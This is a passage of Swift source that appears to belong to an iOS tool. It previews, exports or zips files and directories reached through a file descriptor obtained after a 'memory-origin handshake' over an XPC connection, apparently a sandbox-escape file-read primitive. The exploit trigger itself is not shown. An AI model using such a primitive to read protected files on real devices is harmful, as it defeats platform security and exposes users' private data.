                        let coordinator = NSFileCoordinator()
                        var coordinationError: NSError?
                        var successZip = false

                        coordinator.coordinate(readingItemAt: tempDir, options: [.forUploading], error: &coordinationError) { zipURL in
                            do {
                                try FileManager.default.copyItem(at: zipURL, to: destinationZipURL)
                                successZip = true
                            } catch {
                                logLine("Failed to copy zip: \(error.localizedDescription)")
                            }
                        }

                        try? FileManager.default.removeItem(at: tempDir)

                        if successZip {
                            logLine("Saved \(stats.totalBytes) bytes: \(zipFilename)")
                            onSaved(destinationZipURL)
                        } else {
                            logLine("Failed to create zip archive")
                        }
                    case .preview, .exportFile:
                        close(initialFd)
                        logLine("Target is a directory, not a file.")
                    }
                } else if fileType == mode_t(S_IFREG) {
                    switch action {
                    case .preview:
                        logLine("Target is a single file.")
                        let size = Int64(st.st_size)
                        if size <= 0 {
                            logLine("File is empty.")
                            close(initialFd)
                            break
                        }
                        let cap = min(size, previewCap)
                        var buffer = [UInt8](repeating: 0, count: Int(cap))
                        let count = pread(initialFd, &buffer, buffer.count, 0)
                        close(initialFd)
                        if count > 0 {
                            onPreview(Data(buffer.prefix(count)), size)
                        } else {
                            logLine("Read failed: errno=\(errno)")
                        }
                    case .exportFile:
                        logLine("Target is a single file.")
                        saveFile(fd: initialFd, outputName: outputName)
                        let output = docs.appendingPathComponent(outputName)
                        if FileManager.default.fileExists(atPath: output.path) {
                            onSaved(output)
                        }
                    case .list, .exportZip:
                        close(initialFd)
                        logLine("Target is a file, not a directory.")
                        if action == .list { onListFailed() }
                    }
                } else {
                    close(initialFd)
                    logLine("Target is neither a regular file nor a directory.")
                    if action == .list { onListFailed() }
                }
            } else {
                close(initialFd)
                logLine("Failed to fstat target FD.")
                if action == .list { onListFailed() }
            }
        } else {
            logLine("Failed to obtain initial FD for target path.")
            if action == .list { onListFailed() }
        }
    } else {
        logLine("Read skipped: memory-origin handshake was not established")
        if action == .list { onListFailed() }
    }

    releaseFigReference(memoryOrigin)
    memoryOrigin = nil
    releaseFigReference(memoryRecipient)
    memoryRecipient = nil

    fConnCancel(conn)
    fRel(OpaquePointer(conn))
    logLine("XPC connection cancelled and released")
    logLine("Run finished")
}
